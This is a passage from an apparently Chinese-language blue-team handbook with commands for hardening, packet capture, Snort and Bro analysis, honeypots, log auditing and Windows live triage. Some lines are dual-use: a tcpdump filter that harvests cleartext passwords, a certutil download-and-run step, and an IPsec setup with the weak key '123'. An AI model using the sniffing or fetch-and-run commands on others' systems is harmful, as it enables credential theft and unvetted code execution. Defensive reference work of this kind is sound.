ipsec static add filteraction name=MyIPsecAction action=negotiate C:\\> netsh ipsec static add policy name=MyIPsecPolicy assign=yes C:\\> netsh ipsec static add rule name=MyIPsecRule policy=MyIPsecPolicy filterlist=MyIPsecFilter filteraction=MyIPsecAction conntype=all activate=yes psk=\u5bc6\u7801 # 2.\uff09\u65b0\u5efa\u4e00\u6761\u5141\u8bb8\u8bbf\u95ee\u5916\u7f51TCP 80\u548c443\u7aef\u53e3\u7684IPSEC\u7b56\u7565 C:\\> netsh ipsec static add filteraction name=Allow action=permit C:\\> netsh ipsec static add filter filterlist=WebFilter srcaddr=Any dstaddr=Any protocol=TCP dstport=80 C:\\> netsh ipsec static add filter filterlist=WebFilter srcaddr=Any dstaddr=Any protocol=TCP dstport=443 C:\\> netsh ipsec static add rule name=WebAllow policy=MyIPsecPolicy filterlist=WebFilter filteraction=Allow conntype=all activate=yes psk=\u5bc6\u7801 # 3.\uff09\u67e5\u770b\u548c\u7981\u7528\u67d0\u6761IPSEC\u672c\u5730\u5b89\u5168\u7b56\u7565 C:\\> netsh ipsec static show policy name=MyIPsecPolicy C:\\> netsh ipsec static set policy name=MyIPsecPolicy assign=no # \u65b0\u5efa\u4e00\u6761IPSEC\u5bf9\u5e94\u7684\u9632\u706b\u5899\u89c4\u5219\uff0c\u6e90\u5730\u5740\u548c\u76ee\u7684\u5730\u5740\u4e3aany C:\\> netsh advfirewall consec add rule name=\"IPSEC\" endpointl=any endpoint2=any action=requireinrequireout qmsecmethods=default # \u65b0\u5efa\u4e00\u6761IPSEC\u5bf9\u5e94\u7684\u9632\u706b\u5899\u89c4\u5219\uff0c\u6240\u6709\u51fa\u7ad9\u8bf7\u6c42\u5fc5\u987b\u63d0\u4f9b\u9884\u5171\u4eab\u5bc6\u94a5 C:\\> netsh advfirewall firewall add rule name=\"IPSEC_Out\" dir=out action=allow enable=yes profile=any localip=any remoteip=any protocol=any interfacetype=any security=authenticate 2.1.6 \u5176\u4ed6\u5b89\u5168\u7b56\u7565 # \u7981\u7528\u8fdc\u7a0b\u684c\u9762\u8fde\u63a5 C:\\> reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\TerminalServer\" /f /v fDenyTSConnections /t REG_DWORD /d 1 # \u53ea\u53d1\u9001NTLMv2\u54cd\u5e94\uff08\u9632\u6b62\u201c\u6c38\u6052\u4e4b\u84dd\u201d\u6f0f\u6d1e\u653b\u51fb\uff09 C:\\> reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f # \u7981\u7528IPV6 C:\\> reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\TCPIP6\\Parameters /v DisabledComponents /t REG_DWORD /d 255 /f # \u7981\u7528sticky\u952e C:\\> reg add \"HKCU\\ControlPanel\\Accessibility\\StickyKeys\" /v Flags /t REG_SZ /d 506 /f # \u7981\u7528\u7ba1\u7406\u5171\u4eab\uff08Servers/Workstations\uff09 C:\\> reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /f /v AutoShareServer /t REG_DWORD /d 0 C:\\> reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /f /v AutoShareWks /t REG_DWORD /d 0 # \u7981\u7528\u6ce8\u518c\u8868\u7f16\u8f91\u5668\u548cCMD\u547d\u4ee4\u63d0\u793a\u7b26 C:\\> reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f C:\\> reg add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 1 /f # \u542f\u7528UAC C:\\> reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f # \u542f\u7528\u9632\u706b\u5899\u65e5\u5fd7\u529f\u80fd C:\\> netsh firewall set logging droppedpackets = enable C:\\> netsh firewall set logging connections = enable 2.2 ) LINUX\u7cfb\u7edf\u7bc7 2.2.1 \u670d\u52a1\u7ba1\u7406 # \u67e5\u770b\u670d\u52a1\u72b6\u6001 service --status-all ps -ef OR ps -aux initctl list systemctl list-unit-files # \u542f\u52a8\uff0c\u505c\u6b62\u548c\u7981\u7528\u670d\u52a1 \\# For Upstart services: /etc/init.d/apache2 start | stop | status service apache2 start | stop | status update-rc.d apache2 disable \\# For Systemd services: systemctl start | stop | status ntp.service systemctl disable sshd.service 2.2.2 \u9632\u706b\u5899\u7ba1\u7406 # iptables \u5e38\u7528\u64cd\u4f5c\uff1a iptables-save > filewall_rules.bak \\# \u5bfc\u51fa\u5f53\u524d\u89c4\u5219 iptables -vnL --line \\# \u5217\u51fa\u6240\u6709\u89c4\u5219 iptables -S \\# \u540c\u4e0a iptables -P INPUT DROP \\# \u9ed8\u8ba4\u7b56\u7565\uff0c\u7981\u6b62\u6240\u6709\u8fde\u63a5 iptables -A INPUT -s 10.10.10.10 -j DROP \\# \u7981\u6b62\u5355\u4e2aIP iptables -A INPUT -s 10,10.10.0/24 -j DROP \\# \u7981\u6b62\u4e00\u4e2a\u7f51\u6bb5 iptables -A INPUT -p tcp --dport ssh -s 10.10.10.10 -j DROP \\# \u7981\u6b62\u67d0IP\u8bbf\u95ee\u672c\u673aSSH\u670d\u52a1 iptables -A INPUT -p tcp --dport ssh -j DROP \\# \u7981\u6b62\u8bbf\u95ee\u672c\u673aSSH\u670d\u52a1 iptables -I INPUT 5 -m limit --limit 5/min -j LOG --log-prefix \"iptables denied: \" --log-level 7 \\# \u542f\u7528\u65e5\u5fd7\u8bb0\u5f55 iptables -F \\# \u6e05\u9664\u5f53\u524d\u5df2\u52a0\u8f7d\u7684\u89c4\u5219 2.2.3 DNS\u7f13\u5b58 # Unix/Linux\u7cfb\u7edf\u6ca1\u6709\u7cfb\u7edf\u7ea7\u522bDNS\u7f13\u5b58 2.2.4 \u914d\u7f6eIPSEC # \u5728\u4e24\u53f0\u670d\u52a1\u5668\u4e4b\u95f4\u5efa\u7acbIPSEC\u901a\u9053 \\# 1.\uff09\u6dfb\u52a0\u9632\u706b\u5899\u89c4\u5219\u5141\u8bb8IPSEC\u534f\u8bae iptables -A INPUT -p esp -j ACCEPT iptables -A INPUT -p ah -j ACCEPT iptables -A INPUT -p udp --dport 500 -j ACCEPT iptables -A INPUT -p udp --dport 4500 -j ACCEPT \\# \u5b89\u88c5Racoon apt -y install racoon \\# 2.\uff09\u7f16\u8f91\u914d\u7f6e\u6587\u4ef6\uff1a/etc/ipsec-tools.conf flush; spdflush; spdadd \u4e3b\u673aA\u7684IP\u5730\u5740 \u4e3b\u673aB\u7684IP\u5730\u5740 any -P out ipsec esp/transport//require; spdadd \u4e3b\u673aB\u7684IP\u5730\u5740 \u4e3b\u673aA\u7684IP\u5730\u5740 any -P in ipsec esp/transport//require; \\# 3.\uff09\u7f16\u8f91\u914d\u7f6e\u6587\u4ef6\uff1a/etc/racoon/racoon.conf log notify; path pre_shared_key \"/etc/racoon/psk.txt\"; path certificate \"/etc/racoon/certs\"; remote anonymous { exchange_mode main,aggressive; proposal { encryption_algorithm aes_256; hash_algorithm sha256; authentication_method pre_shared_key; dh_group modp1024; } generate_policy off; } sainfo anonymous{ pfs_group 2; encryption_algorithm aes_256; authentication_algorithm hmac_sha256; compression_algorithm deflate; } \\# 4.\uff09\u6dfb\u52a0\u9884\u5171\u4eab\u5bc6\u94a5 \u4e3b\u673aA\uff1aecho \u4e3b\u673aB 123 >> /etc/racoon/psk.txt \u4e3b\u673aB\uff1aecho \u4e3b\u673aA 123 >> /etc/racoon/psk.txt \\# 5.\uff09\u91cd\u542f\u670d\u52a1\uff0c\u68c0\u67e5\u534f\u5546\u53ca\u914d\u7f6e\u7b56\u7565 service setkey restart setkey -D setkey -DP","title":"2. ) \u5b89\u5168\u52a0\u56fa"},{"location":"blueteam/%E8%93%9D%E9%98%9F%E6%89%8B%E5%86%8C/#3-visibility","text":"3.1 ) \u7f51\u7edc\u5b89\u5168\u76d1\u63a7 3.1.1 \u6570\u636e\u5305\u6355\u6349\u4e0e\u5206\u6790 1.\uff09TCPDUMP tcpdump -tttt -n -vv \\# \u6253\u5370\u65f6\u6233\uff0c\u7981\u7528\u540d\u79f0\u89e3\u6790\u5e76\u4ee5verbose\u65b9\u5f0f\u663e\u793a tcpdump -nn -c 1000 | awk '{print $3}' | cut -d. -f1-4 | sort -n | uniq -c | sort -nr \\# \u6355\u63491000\u4e2a\u6570\u636e\u5305\uff0c\u627e\u51faTop talkers tcpdump -w target.pcap -i any dst targetIP and port 80 \\# \u5728\u6240\u6709\u63a5\u53e3\u4e0a\u6355\u6349\u76ee\u6807IP\u4e3a\uff1atargetIP\u4e14\u7aef\u53e3\u4e3a80\u7684\u6570\u636e\u5305\u5e76\u5199\u5165target.pcap\u6587\u4ef6 tcpdump host 10.0.0.1 && host 10.0.0.2 \\# \u6355\u6349\u4e24\u4e2a\u4e3b\u673a\u4e4b\u95f4\u7684\u6570\u636e\u5305 tcpdump not net 10.10 && not host 192.168.1.2 \\#\u6355\u6349\u975e10.10\u7f51\u6bb5\u53ca\u975e192.168.1.2\u4e3b\u673a\u7684\u6570\u636e\u5305tcpdump host 10.10.10.10 && \\(10.10.10.20 or 10.10.10.30\\) \\# \u6355\u6349\u4e3b\u673aA\u4e0e\u4e3b\u673aB\u6216C\u7684\u6570\u636e\u5305tcpdump -n -s0 -C 100 -w 001.pcap \\# \u8f6e\u8be2\uff0c\u6587\u4ef6\u5927\u5c0f\u8d85\u8fc7100M\u540e\u81ea\u52a8\u521b\u5efa\u65b0\u6587\u4ef6 tcpdump -w - | ssh ServerIP -p 50005 \"cat - > /tmp/remotecapture.pcap\" \\# \u901a\u8fc7SSH\u4fdd\u5b58\u6570\u636e\u5305\u5230\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u7684/tmp/remotecapture.pcap\u6587\u4ef6 tcpdump -n -A -s0 port http or port ftp or port smtp or port imap or port pop3 | egrep -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|P asswd=|password=|pass:|user:|username:|password:|login:|pass|user' --color=auto --line-buffered -B20 \\# \u6293\u53d6\u660e\u6587\u5bc6\u7801 tcpdump -s 1500 -A '(tcp[((tcp[12:1] & 0xf0) >> 2)+5:1] = 0x01) and (tcp[((tcp[12:1] & 0xf0) >> 2):1] = 0x16)' \\#\u67e5\u627e\u81ea\u7b7e\u540d\u8bc1\u4e66 2.\uff09TSHARK tshark -nr 001.pcap -Y \"ssl.handshake.ciphersuites\" -Vx | grep \"ServerName:\" | sort | uniq -c | sort -r \\# \u63d0\u53d6\u8bc1\u4e66Server Name\u5b57\u6bb5 tshark -D \\# \u5217\u51fa\u6240\u6709\u53ef\u7528\u63a5\u53e3 tshark -i eth0 -i eth1 \\# \u76d1\u542c\u591a\u4e2a\u63a5\u53e3 tshark -nn -w 001.pcap \\# \u7981\u7528\u540d\u79f0\u89e3\u6790\u5e76\u4fdd\u5b58\u5230\u6587\u4ef6 tshark arp or icmp \\# \u6355\u6349arp\u6216\u8005icmp tshark \"host \u4e3b\u673aA && host \u4e3b\u673aB\" \\# \u6355\u6349\u4e24\u4e2a\u4e3b\u673a\u4e4b\u95f4\u7684\u6570\u636e\u5305 tshark -r 001.pcap \\# \u8bfb\u53d6\u6570\u636e\u5305 tshark -n -e ip.src -e ip.dst -T fields -E separator=, -2 -R ip -r 001.pcap \\# \u63d0\u53d6\u6e90/\u76ee\u7684IP\u5730\u5740 tshark -n -e ip.src -e dns,qry.name -E separator=';' -T fields port 53 \\# \u63d0\u53d6DNS\u67e5\u8be2\u7684\u6e90IP\u53caDNS\u67e5\u8be2\u7684\u57df\u540d tshark -2 -R http.request -T fields -E separator=';' -e http.host -e http.request.uri -r 001.pcap \\# \u63d0\u53d6HTTP\u8bf7\u6c42\u4e2d\u7684host\u53c2\u6570\u548c\u8bf7\u6c42uri tshark -n -c 150 I awk '{print $4}' I sort -n | uniq -c | sort -nr \\# \u63d0\u53d6top talkers tshark -q -z io,phs -r 001.pcap \\# \u534f\u8bae\u7edf\u8ba1 tshark -n -c 100 -e ip.src -Y \"dns.flags.response eq 1\" -T fields port 53 \\# \u63d0\u53d6DNS\u54cd\u5e94\u6570\u636e\u5305\u7684DNS\u670d\u52a1\u5668\u5730\u5740 tshark -n -e http.request.uri -Y http.request -T fields | grep exe \\# \u63d0\u53d6\u901a\u8fc7http\u8bf7\u6c42\u65b9\u5f0f\u4e0b\u8f7dexe\u53ef\u6267\u884c\u6587\u4ef6\u7684\u6570\u636e\u5305 3.\uff09SNORT snort -T -c /etc/snort/snort.conf \\# \u914d\u7f6e\u6587\u4ef6\u6d4b\u8bd5 snort -dv -r 001.log \\# \u8bfb\u53d6\u6570\u636e\u5305 snort -dvr 001.log icmp \\# \u63d0\u53d6icmp\u6570\u636e\u5305 snort -K ascii -l 001 \\# \u4ee5ASCII\u683c\u5f0f\u663e\u793a snort -q -A console -i eth0 -c /etc/snort/snort.conf \\# \u5728\u7ec8\u7aef\u4e0a\u663e\u793asnort events echo 'log tcp 192.168.1.0/24 any -> 192.168.1.95 22 ( msg: \"ssh access\" ; sid:1618008; )' > 001.rule && snort -T -c 001.rule \\# \u89c4\u5219\u6d4b\u8bd5 mkdir logs && snort -vd -c 001.rule -r 001.pcap -A console -l logs \\# \u6267\u884c\u89c4\u5219 4.\uff09Bro NSM \u5b89\u88c5\u53ca\u4e0b\u8f7d\u76f8\u5173\u8f6f\u4ef6\u5305\u548c\u6570\u636e\u5305 apt -y install bro bro-aux pip install bro-pkg bro-pkg install bro/hosom/file-extraction wget https://www.malware-traffic-analysis.net/2018/01/12/2018-01-12-NanoCore-RAT-traffic.pcap.zip wget https://www.bro.org/static/exchange-2013/faf-exercise.pcap bro -r 2018-01-12-NanoCore-RAT-traffic.pcap \\# \u4ecepcap\u6587\u4ef6\u4e2d\u8bfb\u53d6\u5e76\u521b\u5efa\u76f8\u5173\u65e5\u5fd7\u6587\u4ef6 bro -r faf-exercise.pcap /root/.bro-pkg/scratch/file-extraction/scripts/plugins/extract-pe.bro && ls -lhct ./extract_files/ \\# \u63d0\u53d6\u51faexe\u6587\u4ef6bro -r faf-exercise.pcap /usr/share/bro/policy/frameworks/files/extract-all-files.bro \\# \u63d0\u53d6\u591a\u4e2a\u7c7b\u578b\u7684\u6587\u4ef6 bro -C -r faf-exercise.pcap && cat ssl.log | bro-cut server_name , subject , issuer \\# \u63d0\u53d6\u8bc1\u4e66\u4e2d\u7684server_name,issuer\u548csubjects\u5b57\u6bb5 cat conn.log | bro-cut id.orig_h , id.orig_p , id.resp_h , id.resp_p , proto , conn_state \\# \u63d0\u53d6\u6e90IP\uff0c\u6e90\u7aef\u53e3\uff0c\u76ee\u7684IP\uff0c\u76ee\u7684\u7aef\u53e3\uff0c\u534f\u8bae\u7c7b\u578b\uff0ctcp\u6807\u8bb0 cat dns.log | bro-cut query | sort -u \\# \u63d0\u53d6DNS\u67e5\u8be2name cat http.log | bro-cut id.orig_h , id.orig_p , id.resp_h , id.resp_p , host , uri , referrer \\# \u63d0\u53d6\u6e90IP\uff0c\u6e90\u7aef\u53e3\uff0c\u76ee\u7684IP\uff0c\u76ee\u7684\u7aef\u53e3\uff0chost\uff0curi\uff0creferrer\u5b57\u6bb5 cat http.log | bro-cut user_agent | sort -u \\# \u63d0\u53d6user_agent\u5b57\u6bb5 5.\uff09EDITCAP editcap -F pcap -c 1000 orignal.pcap out_split.pcap \\# \u4ee51000\u4e3a\u5355\u4f4d\u8fdb\u884c\u5206\u5272 editcap -F pcap -t+3600 orignal.pcap out_split.pcap \\# \u4ee51\u5c0f\u65f6\u4e3a\u5355\u4f4d\u8fdb\u884c\u5206\u5272 6.\uff09MERGECAP mergecap -w merged_cap.pcap capl.pcap cap2.pcap cap3.pcap \\# \u5408\u5e76\u591a\u4e2a\u6587\u4ef6 7.\uff09PacketTotal https://www.packettotal.com/app/analysis?id=c8c11b792272ac19a49299a3687466be&name=files 8.\uff09NetworkMiner http://netres.ec/?b=173588E 3.2 ) \u871c\u7f50\u6280\u672f 3.2.1 WINDOWS\u7cfb\u7edf\u7bc7 1.\uff09 \u7aef\u53e3\u871c\u7f50 \\# \u539f\u7406\uff1a\u76d1\u542c\u7aef\u53e3\uff0c\u5f53\u5ba2\u6237\u7aef\u6210\u529f\u5efa\u7acbTCP\uff083\u6b21\u63e1\u624b\uff09\u8fde\u63a5\u540e\uff0c\u8bb0\u5f55\u8bbf\u95ee\u65e5\u5fd7\uff0c\u7136\u540e\u6dfb\u52a0\u9632\u706b\u5899\u89c4\u5219\u5c01\u7981\u6b64IP PS C:\\> certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Pwdrkeg/honeyport/master/honeyport.ps1 PS C:\\> .\\honeyport.ps1 -Ports 4444,22,21,23 -WhiteList 192.168.10.1,192.168.10.2 -Block $true -Verbose PS C:\\> Get-EventLog HoneyPort \\# \u67e5\u770b\u65e5\u5fd7\u8bb0\u5f55\u4fe1\u606f PS C:\\> stop-job -name HoneyPort \\# \u505c\u6b62\u4efb\u52a1 PS C:\\> remove-job -name HoneyPort \\# \u79fb\u9664\u4efb\u52a1 3.2.2 LINUX\u7cfb\u7edf\u7bc7 1.\uff09 \u7aef\u53e3\u871c\u7f50 \\# \u539f\u7406\u540c\u4e0a wget https://raw.githubusercontent.com/gchetrick/honeyports/master/honeyports-0.5.py python honeyports-0.5.py -p 1234 -h 192.168.1.100 -D 3.3 ) (PASSIVE)\u76d1\u63a7DNS\u89e3\u6790 apt -y install dnstop dnstop -l 3 eth0 dnstop -l 3 001.pcap | out.txt 3.4 ) \u65e5\u5fd7\u5ba1\u8ba1 1.\uff09WINDOWS \\# \u589e\u52a0\u65e5\u5fd7\u6587\u4ef6\u5927\u5c0f\u8fdb\u884c\u65e5\u5fd7\u5ba1\u8ba1 C:\\> reg add HKLM\\Software\\Policies\\Microsoft\\Windows\\Eventlog\\Application /v MaxSize /t REG_DWORD /d 0x19000 C:\\> reg add HKLM\\Software\\Policies\\Microsoft\\Windows\\Eventlog\\Security /v MaxSize /t REG_DWORD /d 0x64000 C:\\> reg add HKLM\\Software\\Policies\\Microsoft\\Windows\\EventLog\\System /v MaxSize /t REG_DWORD /d 0x19000 \\# \u67e5\u770bWindows\u4e8b\u4ef6\u65e5\u5fd7-\u5b89\u5168\u65e5\u5fd7\u7684\u914d\u7f6e C:\\> wevtutil gl Security \\# \u68c0\u67e5\u5ba1\u6838\u7b56\u7565 auditpol /get /category:* \\# \u5bf9\u6240\u6709\u9879\u542f\u7528\u6210\u529f\u548c\u5931\u8d25\u7684\u5ba1\u6838\u7b56\u7565 C:\\> auditpol /set /category:* /success:enable /failure:enable \\# \u67e5\u770b\u5df2\u914d\u7f6e\u7684\u4e8b\u4ef6\u65e5\u5fd7\u7684\u6982\u8981\u4fe1\u606f PS C:\\> Get-Eventlog -list \\# \u53d6\u6700\u8fd15\u6761\u5e94\u7528\u7a0b\u5e8f\u65e5\u5fd7 PS C:\\> Get-Eventlog -newest 5 -logname application | Format-List \\# \u53d6Eent ID\uff1a4672\u7684\u6240\u6709\u65e5\u5fd7 PS C:\\> Get-Eventlog Security | ? { $_.Eventid -eq 4672} \\# \u767b\u5f55\u4e0e\u6ce8\u9500\u4e8b\u4ef6 PS C:\\> Get-Eventlog Security 4625,4634,4647,4624,4625,4648,4675,6272,6273,6274,6275,6276,6277,6278,6279,6280,4649,4778,4779,4800,4801,4802,4803,5378,5632,5633,4964 -after ((get-date).addDays(-1)) \\# DPAPI\u884c\u4e3a\uff0c\u8fdb\u7a0b\u7ec8\u6b62\uff0cRPC\u4e8b\u4ef6 PS C:\\> Get-EventLog Security 4692,4693,4694,4695,4689,5712 -after ((get-date).addDays(-1)) \\# \u6587\u4ef6\u5171\u4eab\uff0c\u6587\u4ef6\u7cfb\u7edf\uff0cSAM\uff0c\u6ce8\u518c\u8868\uff0c\u8bc1\u4e66\u65f6\u95f4 PS C:\\ Get-EventLog Security 4671,4691,4698,4699,4700,4701,4702,5148,5149,5888,5889,5890,4657,5039,4659,4660,4661,4663,4656,4658,4690,4874,4875,4880,4881,4882,4884,4885,4888,4890,4891,4892,4895,4896,4898,5145,5140,5142,5143,5144,5168,5140,5142,5143,5144,5168,5140,5142,5143,5144,5168,4664,4985,5152,5153,5031,5140,5150,5151,5154,5155,5156,5157,5158,5159 -after ((get-date).addDays(-1)) \\# \u67e5\u770bEent ID\uff1a4672\u7684\u8be6\u7ec6\u4fe1\u606f Get-Eventlog Security | ? { $_.Eventid -eq 4672} | Format-List 2.\uff09LINUX \\# \u8ba4\u8bc1\u65e5\u5fd7 tail /var/log/auth. log grep -i \"fail\" /var/log/auth. log tail /var/log/secure grep -i \"fail\" /var/log/secure \\# samba\uff0ccron,sudo\u76f8\u5173\u65e5\u5fd7 grep -i samba /var/log/syslog grep -i samba /var/log/messages grep -i cron /var/log/syslog grep -i sudo /var/log/auth. log grep -i sudo /var/log/secure \\# Apache 404\u9519\u8bef\u65e5\u5fd7 grep 404 apache.log | grep -v -E \"favicon.ico|robots.txt\" \\# \u76d1\u63a7\u65b0\u6587\u4ef6\uff0c5\u5206\u949f\u5237\u65b0\u4e00\u6b21 watch -n 300 -d ls -lR /web_root","title":"3. ) \u68c0\u6d4b\uff08Visibility\uff09"},{"location":"blueteam/%E8%93%9D%E9%98%9F%E6%89%8B%E5%86%8C/#4","text":"4.1 ) LIVE TRIAGE\uff08\u6536\u96c6\u8fd0\u884c\u65f6\u7cfb\u7edf\u4fe1\u606f\uff09 4.1.1 WINDOWS\u7cfb\u7edf\u7bc7 1.\uff09\u7cfb\u7edf\u4fe1\u606f C:\\> echo %DATE% %TIME% C:\\> hostname C:\\> systeminfo C:\\> systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" C:\\> wmic csproduct get name C:\\> wmic bios get serialnumber C:\\> wmic computersystem list brief C:\\> psinfo -accepteula -s -h -d 2.\uff09\u7528\u6237\u4fe1\u606f C:\\> whoami C:\\> net users C:\\> net localgroup administrators C:\\> net group administrators C:\\> wmic rdtoggle list C:\\> wmic useraccount list C:\\> wmic group list C:\\> wmic netlogin get name,lastlogon,badpasswordcount C:\\> wmic netclient list brief C:\\> doskey /history > history.txt 3.\uff09\u7f51\u7edc\u4fe1\u606f C:\\> netstat -e C:\\> netstat -naob C:\\> netstat -nr C:\\> netstat -vb C:\\> nbtstat -s C:\\> route print C:\\> arp -a C:\\> ipconfig /displaydns C:\\> netsh winhttp show proxy C:\\> ipconfig /allcompartments /all C:\\> netsh wlan show interfaces C:\\> netsh wlan show all C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections\\WinHttpSettings\" C:\\> type %SYSTEMROOT%\\system32\\drivers\\etc\\hosts C:\\> wmic nicconfig get descriptions,IPaddress,MACaddress C:\\> wmic netuse get name,username,connectiontype, localname 4.\uff09\u670d\u52a1\u4fe1\u606f C:\\> at C:\\> tasklist C:\\> tasklist /svc C:\\> tasklist /SVC /fi \"imagename eq svchost.exe\" C:\\> tasklist /SVC /fi \"imagename eq svchost.exe\" C:\\> schtasks C:\\> net start C:\\> sc query C:\\> wmic service list brief | findstr \"Running\" C:\\> wmic service list conf ig C:\\> wmic process list brief C:\\> wmic process list status C:\\> wmic process list memory C:\\> wmic job list brief PS C:\\> Get-Service | Where-Object { $_.Status -eq \"running\" } 5.\uff09\u7b56\u7565\u3001\u8865\u4e01\u3001\u73af\u5883\u53d8\u91cf\u4fe1\u606f C:\\> set C:\\> gpresult /r C:\\> gpresult /z > output.txt C:\\> gpresult /H report.html /F C:\\> wmic qfe 6.\uff09\u81ea\u542f\u52a8\u4fe1\u606f C:\\> wmic startup list full C:\\> wmic ntdomain list brief 6.1\uff09\u68c0\u67e5\u81ea\u542f\u52a8\u6587\u4ef6\u76ee\u5f55 C:\\> dir \"%SystemDrive%\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" C:\\> dir \"%SystemDrive%\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\"C:\\> dir %userprofile%\\Start Menu\\Programs\\Startup C:\\> %ProgramFiles%\\Startup\\ C:\\> dir C:\\Windows\\Start Menu\\Programs\\startup C:\\> dir \"C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" C:\\> dir \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" C:\\> dir \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" C:\\> dir \"%ALLUSERSPROFILE%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" C:\\> dir \"%ALLUSERSPROFILE%\\Start Menu\\Programs\\Startup\" C:\\> type C:\\Windows\\winstart.bat C:\\> type %windir%\\wininit.ini C:\\> type %windir%\\win.ini C:\\> type C:\\Autoexec.bat\" 6.2\uff09\u4f7f\u7528autoruns C:\\> autorunsc -accepteula -m 6.3\uff09\u81ea\u542f\u52a8\u6ce8\u518c\u8868\u4f4d\u7f6e HKEY_CLASSES_ROOT: C:\\> reg query HKCR\\Comfile\\Shell\\Open\\Command C:\\> reg query HKCR\\Batfile\\Shell\\Open\\Command C:\\> reg query HKCR\\htafile\\Shell\\Open\\Command C:\\> reg query HKCR\\Exefile\\Shell\\Open\\Command C:\\> reg query HKCR\\Exefiles\\Shell\\Open\\Command C:\\> reg query HKCR\\piffile\\shell\\open\\command HKEY_CURRENT_USERS: C:\\> reg query \"HKCU\\Control Panel\\Desktop\" C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce\" C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\" C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\" C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Windows\\Run\" C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Windows\\Load\" C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Windows\\Scripts\" C:\\> reg query \"HKCU\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Windows\" /f run C:\\> reg query \"HKCU\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Windows\" /f load C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs\" C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\LastVisitedMRU\" C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComD1g32\\OpenSaveMRU\" C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\LastVisitedPidlMRU\"C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComD1g32\\OpenSavePidlMRU\" /sC:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\" C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\" C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" C:\\> reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\RegEdit\" /v LastKey C:\\> reg query \"HKCU\\Software\\Microsoft\\InternetExplorer\\\" TypedURLs C:\\> reg query \"HKCU\\Software\\Policies\\Microsoft\\Windows\\ControlPanel\\Desktop\" HKEY_LOCAL_MACHINE: C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\" /s C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\explorer\\User Shell Folders\" C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\explorer\\Shell Folders\" C:\\> reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\explorer\\ShellExecuteHooks\" C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects\" /s C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Runonce\" C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\" C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices\" C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Winlogon\\Userinit\" C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\shellServiceObjectDelayLoad\" C:\\> reg query 